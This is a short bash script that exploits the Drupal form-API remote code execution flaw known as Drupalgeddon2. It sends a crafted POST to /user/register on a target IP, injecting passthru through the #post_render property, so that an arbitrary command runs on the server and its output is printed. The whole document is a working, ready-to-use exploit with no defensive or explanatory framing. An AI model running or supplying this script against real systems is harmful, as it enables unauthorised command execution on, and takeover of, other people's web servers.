#!/bin/bash

ip=$1

cmd=$2

url="http://$ip/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"

output="$(curl -s -X POST $url -d "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=passthru&mail[a][#type]=markup&mail[a][#markup]=$cmd" | cut -d '[' -f 1)"

echo $output

 